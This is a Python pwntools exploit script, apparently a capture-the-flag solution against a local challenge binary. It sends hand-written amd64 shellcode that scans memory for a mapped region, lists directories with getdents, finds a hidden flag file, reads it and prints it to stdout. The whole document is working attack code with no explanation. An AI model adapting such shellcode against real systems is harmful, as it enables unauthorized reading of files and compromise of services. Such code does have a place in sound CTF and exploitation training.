from pwn import *
context.arch='amd64'

e = ELF('./prob')
# p = e.process()
p = process(['python3', 'run.py'])
# p = remote('0', 51254)

pay = '''
mov rsi, 0x200FFFFFF000
mov rdi, 3
mov rdx, 4
find_map:
    xor rax, rax
    syscall
    cmp rax, 4
    je found_map
    sub rsi, 0x1000
    jmp find_map
found_map:
    sub rsi, 0x1000
    xor rsp, rsi
    xor rbp, rsi
    sub rsi, 0x2000
    xor rdi, rdi
    sub rdi, 100
    mov word ptr[rsi], 0x2f2e
    xor rdx, rdx
    xor r10, r10
    mov rax, 257
    syscall
    mov rdi, rax
    add rsi, 0x2000
    mov rdx, 0x1000
    mov rax, 78
    syscall

    mov r15, rsi
find_dir:
    mov rsi, r15
    mov r14, qword ptr[rsi + 0x10]
    and r14, 0xffff
    cmp byte ptr[rsi+0x12], 0x2e
    je pass1
    xor rdi, rdi
    sub rdi, 100
    add rsi, 0x12
    xor rdx, rdx
    xor r10, r10
    mov rax, 257
    syscall
    mov rdi, rax
    mov rsi, rbp
    add rsi, 0x1000
    mov rdx, 4
    xor rax, rax
    syscall
    cmp rax, 4
    jne found_dir
pass1:
    add r15, r14
    jmp find_dir

found_dir:
    mov r13, r15
    sub rsi, 0x2000
    mov rdx, 0x1000
    mov rax, 78
    syscall
    
    mov r15, rsi
find_flag:
    mov rsi, r15
    mov r14, qword ptr[rsi + 0x10]
    and r14, 0xffff
    cmp byte ptr[rsi+0x12], 0x2e
    je pass2
    jmp found_flag
pass2:
    add r15, r14
    jmp find_flag
found_flag:
    add rsi, 0x12
    sub rsi, 0x23
    add r13, 0x12
    mov word ptr[rsi], 0x2f2e
    add rsi, 2
    mov r12, qword ptr[r13]
    mov qword ptr[rsi], r12
    mov r12, qword ptr[r13+0x8]
    mov qword ptr[rsi+0x8], r12
    mov r12, qword ptr[r13+0x10]
    mov qword ptr[rsi+0x10], r12
    mov r12, qword ptr[r13+0x18]
    mov qword ptr[rsi+0x18], r12
    mov byte ptr[rsi + 0x20], 0x2f
    sub rsi, 2
    xor rdi, rdi
    sub rdi, 100
    xor rdx, rdx
    xor r10, r10
    mov rax, 257
    syscall
    mov rdi, rax
    mov rsi, rbp
    add rsi, 0x1800
    mov rdx, 0x800
    xor rax, rax
    syscall
    mov rdi, 1
    mov rax, 1
    syscall
'''

p.sendafter(b'???: ', asm(pay))

p.interactive()